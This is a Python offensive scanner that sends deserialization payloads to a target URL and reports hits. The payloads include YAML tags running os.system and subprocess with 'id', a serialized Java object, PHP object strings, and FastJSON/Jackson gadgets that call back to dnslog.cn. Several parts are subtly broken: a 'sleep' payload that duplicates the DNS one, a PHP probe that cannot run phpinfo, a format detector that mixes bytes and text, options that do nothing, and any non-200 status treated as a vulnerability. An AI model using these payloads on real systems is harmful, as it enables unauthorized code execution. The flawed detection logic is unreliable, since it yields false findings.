#!/usr/bin/env python3
"""
Deserialization Vulnerability Scanner
Detects insecure deserialization vulnerabilities
"""

import requests
import argparse
import base64
import pickle
import json
import yaml

# Java serialized object magic bytes
JAVA_MAGIC = b'\xac\xed\x00\x05'

# Common deserialization payloads
PAYLOADS = {
    "java": {
        "dns": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgACTAAEaG9zdHEAfgACTAAIcHJvdG9jb2xxAH4AAkwAA3JlZnEAfgACeHAsAAAAAAAACnN0dWZmZmZmZmZ0AAxzdHVmZmZmZmZmLmNvbXQAAi8vdAAKaHR0cHM6Ly8vcQB+AAV4cA==",
        "sleep": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgACTAAEaG9zdHEAfgACTAAIcHJvdG9jb2xxAH4AAkwAA3JlZnEAfgACeHAsAAAAAAAACnN0dWZmZmZmZmZ0AAxzdHVmZmZmZmZmLmNvbXQAAi8vdAAKaHR0cHM6Ly8vcQB+AAV4cA==",
    },
    "php": {
        "phpinfo": 'O:8:"stdClass":0:{}',
        "command": 'O:8:"stdClass":1:{s:4:"test";s:10:"phpinfo();";}',
    },
    "python": {
        "pickle": b'\x80\x04\x95\x17\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)R\x94.',
    },
    "yaml": {
        "basic": "!!python/object/apply:os.system ['id']",
        "advanced": "!!python/object/new:subprocess.check_output [['id']]",
    },
    "json": {
        "fastjson": '{"@type":"java.net.InetAddress","val":"dnslog.cn"}',
        "jackson": '["java.net.URL","http://dnslog.cn"]',
    }
}


def detect_serialization_format(data):
    """Detect the serialization format"""
    formats = []
    
    # Check for Java serialization
    if data.startswith(JAVA_MAGIC) or 'rO0AB' in data:
        formats.append("java")
    
    # Check for PHP serialization
    if data.startswith('O:') or data.startswith('a:') or data.startswith('s:'):
        formats.append("php")
    
    # Check for Python pickle
    try:
        if data.startswith('gASV') or data.startswith('80'):  # base64 pickle
            formats.append("python")
    except:
        pass
    
    # Check for JSON
    if data.startswith('{') or data.startswith('['):
        formats.append("json")
    
    # Check for YAML
    if '!!' in data or data.startswith('---'):
        formats.append("yaml")
    
    return formats


def test_java_deserialization(url, param, payload_type="dns"):
    """Test Java deserialization"""
    try:
        payload = PAYLOADS["java"][payload_type]
        
        # Test with different encodings
        encodings = [
            payload,
            base64.b64encode(base64.b64decode(payload)).decode(),
        ]
        
        for encoded in encodings:
            data = {param: encoded}
            response = requests.post(url, data=data, timeout=10)
            
            if response.status_code != 200:
                return True, f"Status {response.status_code} - possible deserialization error"
        
        return False, None
    except Exception as e:
        return False, str(e)


def test_php_deserialization(url, param):
    """Test PHP deserialization"""
    try:
        payload = PAYLOADS["php"]["phpinfo"]
        
        data = {param: payload}
        response = requests.post(url, data=data, timeout=10)
        
        if "phpinfo" in response.text or "PHP Version" in response.text:
            return True, "PHP object deserialized - phpinfo() executed"
        
        return False, None
    except Exception as e:
        return False, str(e)


def test_yaml_deserialization(url, param):
    """Test YAML deserialization"""
    try:
        payload = PAYLOADS["yaml"]["basic"]
        
        data = {param: payload}
        response = requests.post(url, data=data, timeout=10)
        
        if "uid=" in response.text or "root:" in response.text:
            return True, "YAML deserialization - command executed"
        
        return False, None
    except Exception as e:
        return False, str(e)


def test_json_deserialization(url, param):
    """Test JSON deserialization (FastJSON/Jackson)"""
    try:
        # FastJSON test
        payload = PAYLOADS["json"]["fastjson"]
        
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if "dnslog" in response.text or "exception" in response.text.lower():
            return True, "JSON deserialization vulnerability detected"
        
        return False, None
    except Exception as e:
        return False, str(e)


def scan_deserialization(url, method="POST"):
    """Scan for deserialization vulnerabilities"""
    print(f"[*] Scanning: {url}")
    print(f"[*] Method: {method}\n")
    
    vulnerabilities = []
    
    # Common parameter names for serialized data
    params = ["data", "object", "json", "xml", "payload", "input", "value", "content"]
    
    # Test Java deserialization
    print("[*] Testing Java deserialization...")
    for param in params:
        is_vuln, message = test_java_deserialization(url, param)
        if is_vuln:
            print(f"[+] Java deserialization found!")
            print(f"    Parameter: {param}")
            print(f"    Details: {message}")
            vulnerabilities.append({
                "type": "Java Deserialization",
                "param": param,
                "message": message
            })
            break
    
    # Test PHP deserialization
    print("[*] Testing PHP deserialization...")
    for param in params:
        is_vuln, message = test_php_deserialization(url, param)
        if is_vuln:
            print(f"[+] PHP deserialization found!")
            print(f"    Parameter: {param}")
            print(f"    Details: {message}")
            vulnerabilities.append({
                "type": "PHP Deserialization",
                "param": param,
                "message": message
            })
            break
    
    # Test YAML deserialization
    print("[*] Testing YAML deserialization...")
    for param in params:
        is_vuln, message = test_yaml_deserialization(url, param)
        if is_vuln:
            print(f"[+] YAML deserialization found!")
            print(f"    Parameter: {param}")
            print(f"    Details: {message}")
            vulnerabilities.append({
                "type": "YAML Deserialization",
                "param": param,
                "message": message
            })
            break
    
    # Test JSON deserialization
    print("[*] Testing JSON deserialization...")
    for param in params:
        is_vuln, message = test_json_deserialization(url, param)
        if is_vuln:
            print(f"[+] JSON deserialization found!")
            print(f"    Parameter: {param}")
            print(f"    Details: {message}")
            vulnerabilities.append({
                "type": "JSON Deserialization",
                "param": param,
                "message": message
            })
            break
    
    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(description="Deserialization Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="POST", help="HTTP method")
    parser.add_argument("--proxy", help="Proxy URL")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    vulnerabilities = scan_deserialization(args.url, args.method)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} deserialization vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Type: {vuln['type']}")
            print(f"     Parameter: {vuln['param']}")
            print(f"     Details: {vuln['message']}")
            print()
    else:
        print("\n[-] No deserialization vulnerabilities detected")


if __name__ == "__main__":
    main()
